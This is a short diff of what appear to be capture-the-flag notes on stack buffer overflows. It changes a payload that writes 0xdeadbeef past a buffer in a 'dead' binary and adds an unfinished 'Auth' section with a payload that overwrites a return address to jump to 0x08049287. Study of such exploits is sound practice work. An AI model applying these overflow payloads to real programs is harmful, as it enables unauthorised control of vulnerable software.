@@ -33,6 +33,11 @@
 	- Remember, we are writing BYTES. 0xef is a SINGLE byte still.
 
 - Final payload:
-	- `python -c 'print "A" * 8 + "\xef\xbe\xad\xde"' | ./dead`
+	- `python -c 'print "A" * 0x10 + "\xef\xbe\xad\xde"' | ./dead`
 	- Prints the proper bytes (with the Python hex escaping) and prints it in the proper Endinness.
 
+0x8049287
+### Auth
+- Same as the previous year... add this here... todo...
+
+python -c 'print "AAAA" * 11 + "\x87\x92\x04\x08"' | ./auth
